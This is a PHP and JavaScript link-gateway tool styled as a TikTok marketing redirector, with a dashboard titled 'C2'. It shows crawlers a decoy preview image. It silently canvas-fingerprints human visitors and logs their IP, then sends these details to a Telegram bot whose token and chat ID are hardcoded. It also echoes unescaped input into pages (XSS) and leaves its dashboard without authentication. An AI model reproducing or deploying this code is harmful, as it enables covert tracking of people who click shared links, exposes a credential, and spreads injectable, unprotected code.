<?php
// ==============================================================================
// 🚀 V25 - TIKTOK SMART GATEWAY (Edge Routing & Deep Linking)
// ==============================================================================

date_default_timezone_set('Africa/Algiers');
session_start();
error_reporting(0);

$db_file = __DIR__ . '/tiktok_gateway.sqlite';
$db = new PDO('sqlite:' . $db_file);
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

// إنشاء الجداول
$db->exec("CREATE TABLE IF NOT EXISTS links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    code TEXT UNIQUE,
    target_url TEXT,
    campaign_name TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

$db->exec("CREATE TABLE IF NOT EXISTS clicks (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    code TEXT,
    ttclid TEXT,
    ip TEXT,
    user_agent TEXT,
    device_fp TEXT,
    utm_source TEXT,
    server_event_status TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
)");

// دالة توليد ttclid (محاكاة لمعرف النقرة الخاص بتيك توك)
function generateTTCLID() {
    return 'ttclid_' . bin2hex(random_bytes(8)) . '_' . time();
}

// ==============================================================================
// 1. بوابة التوجيه (The Gateway / Edge Routing)
// ==============================================================================
if (isset($_GET['r'])) {
    $code = $_GET['r'];
    
    // جلب الرابط من قاعدة البيانات
    $stmt = $db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link = $stmt->fetch();
    
    if (!$link) die("Invalid Link");

    // إذا كان الطلب قادماً من بوت (مثل معاينة واتساب)، نعرض صورة
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if (preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook/i', $ua)) {
        echo '<html><head><meta property="og:image" content="https://images.unsplash.com/photo-1611162617474-5b21e879e113?w=600&q=80"></head><body></body></html>';
        exit;
    }

    // --- استقبال بيانات البصمة من الجافاسكريبت (Deferred Data) ---
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['fingerprint'])) {
        $fp = json_decode($_POST['fingerprint'], true);
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
        
        // 1. توليد ttclid أو استخدام الموجود
        $ttclid = $_GET['ttclid'] ?? generateTTCLID();
        
        // 2. التقاط UTM
        $utm_source = $_GET['utm_source'] ?? 'direct';

        // 3. محاكاة إرسال "حدث من جانب الخادم" (Server-Side Event API)
        // في الواقع، هنا يتم إرسال طلب curl إلى TikTok Events API
        $server_event_status = "Event Dispatched to TikTok API [ttclid: {$ttclid}]";

        // 4. حفظ البيانات في قاعدة البيانات
        $stmt = $db->prepare("INSERT INTO clicks (code, ttclid, ip, user_agent, device_fp, utm_source, server_event_status) VALUES (?,?,?,?,?,?,?)");
        $stmt->execute([$code, $ttclid, $ip, $ua, $fp['id'], $utm_source, $server_event_status]);

        // 5. إرسال التقرير لتلجرام
        $msg = "🎯 <b>TikTok Gateway Hit</b>\n\n";
        $msg .= "🔗 <b>Campaign:</b> {$link['campaign_name']}\n";
        $msg .= "🌐 <b>IP:</b> <code>{$ip}</code>\n";
        $msg .= "🆔 <b>ttclid:</b> <code>{$ttclid}</code>\n";
        $msg .= "📊 <b>UTM Source:</b> {$utm_source}\n";
        $msg .= "🧬 <b>Device FP:</b> <code>{$fp['id']}</code>\n";
        $msg .= "⚡ <b>Server Event:</b> {$server_event_status}\n";
        
        $token = '8701062671:AAHPiY9DOr1HNRNQzlb4-4XIhVroYzEMjEU'; 
        $ch = curl_init("https://api.telegram.org/bot{$token}/sendMessage");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => '6475721500', 'text' => $msg, 'parse_mode' => 'HTML']));
        curl_exec($ch); curl_close($ch);

        exit('OK');
    }
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; flex-direction: column; }
        .spinner { width: 40px; height: 40px; border: 4px solid #333; border-top: 4px solid #ff0050; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="spinner"></div>
    <p>Opening in App...</p>

    <script>
        // 1. خدعة الربط المؤجل (Deferred Deep Linking)
        // حفظ بيانات UTM و ttclid في الذاكرة المحلية للجهاز
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('utm_source') || urlParams.has('ttclid')) {
            localStorage.setItem('tiktok_deferred_utm', JSON.stringify({
                utm_source: urlParams.get('utm_source'),
                ttclid: urlParams.get('ttclid'),
                timestamp: Date.now()
            }));
        }

        // 2. جمع البصمة (Identity Stitching)
        function getDeviceFingerprint() {
            let c = document.createElement('canvas');
            let ctx = c.getContext('2d');
            ctx.textBaseline = "top";
            ctx.font = "14px 'Arial'";
            ctx.fillStyle = "#f60";
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = "#069";
            ctx.fillText("Fingerprint", 2, 15);
            let hash = 0;
            let str = c.toDataURL();
            for (let i = 0; i < str.length; i++) {
                hash = ((hash << 5) - hash) + str.charCodeAt(i);
                hash |= 0;
            }
            return Math.abs(hash).toString(16).substring(0, 16);
        }

        // 3. التوجيه للتطبيق (Custom Scheme)
        function openTikTokApp() {
            let targetUrl = "<?php echo $link['target_url']; ?>";
            let schemeUrl = "";

            // إذا كان الرابط يحتوي على فيديو، استخرج الآي دي وحاول فتح التطبيق مباشرة
            let videoIdMatch = targetUrl.match(/\/video\/(\d+)/);
            if (videoIdMatch) {
                // snssdk1128 هو مخطط URL الخاص بتيك توك
                schemeUrl = `snssdk1128://aweme/detail/${videoIdMatch[1]}?refer=web&gd_label=click_schema_lhft_web`;
            } else {
                schemeUrl = "snssdk1128://feed";
            }

            // محاولة فتح التطبيق
            let start = Date.now();
            window.location.href = schemeUrl;

            // 4. Fallback: إذا لم يفتح التطبيق خلال 1.5 ثانية، افتح الموقع
            setTimeout(() => {
                if (Date.now() - start < 2000) {
                    window.location.href = targetUrl;
                }
            }, 1500);
        }

        // التنفيذ
        window.addEventListener('DOMContentLoaded', async () => {
            let fp = { id: getDeviceFingerprint() };
            
            // إرسال البصمة للسيرفر (Server-Side Event)
            let fd = new URLSearchParams();
            fd.append('fingerprint', JSON.stringify(fp));
            await fetch(window.location.href, { method: 'POST', body: fd }).catch(()=>{});

            // محاولة فتح التطبيق
            openTikTokApp();
        });
    </script>
</body>
</html>
<?php
    exit;
}

// ==============================================================================
// 2. لوحة التحكم (Dashboard)
// ==============================================================================
if (isset($_POST['create_link'])) {
    $code = substr(md5(uniqid()), 0, 6);
    $db->prepare("INSERT INTO links (code, target_url, campaign_name) VALUES (?, ?, ?)")
       ->execute([$code, $_POST['target_url'], $_POST['campaign']]);
    header("Location: /?success=1");
    exit;
}

$logs = $db->query("SELECT * FROM clicks ORDER BY id DESC LIMIT 10")->fetchAll();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>TikTok Gateway C2</title>
    <style>
        body { background: #0f0f0f; color: #fff; font-family: monospace; padding: 20px; }
        .box { border: 1px solid #ff0050; padding: 20px; margin-bottom: 20px; border-radius: 8px; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; background: #000; border: 1px solid #333; color: #fff; }
        button { background: #ff0050; color: #fff; padding: 10px 20px; border: none; cursor: pointer; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 12px; }
        th, td { padding: 10px; border-bottom: 1px solid #333; text-align: left; }
        .ttclid { color: #00ffcc; font-weight: bold; }
        .event { color: #ffaa00; }
    </style>
</head>
<body>
    <h1>🚀 TikTok Smart Gateway</h1>
    
    <div class="box">
        <h3>Generate Smart Link</h3>
        <form method="POST">
            <input type="text" name="campaign" placeholder="Campaign Name (e.g., Summer_Promo)" required>
            <input type="text" name="target_url" placeholder="Target TikTok Video URL" required>
            <button name="create_link">Generate Gateway Link</button>
        </form>
        <?php if(isset($_GET['success'])): ?>
            <p style="color: #0f0;">Link generated! Check below.</p>
        <?php endif; ?>
    </div>

    <div class="box">
        <h3>Recent Traffic & Server-Side Events</h3>
        <table>
            <tr>
                <th>Time</th>
                <th>IP</th>
                <th>Device FP</th>
                <th>ttclid</th>
                <th>UTM</th>
                <th>Server Event Status</th>
            </tr>
            <?php foreach($logs as $l): ?>
            <tr>
                <td><?php echo $l['created_at']; ?></td>
                <td><?php echo $l['ip']; ?></td>
                <td><?php echo $l['device_fp']; ?></td>
                <td class="ttclid"><?php echo $l['ttclid']; ?></td>
                <td><?php echo $l['utm_source']; ?></td>
                <td class="event"><?php echo $l['server_event_status']; ?></td>
            </tr>
            <?php endforeach; ?>
        </table>
    </div>
</body>
</html>
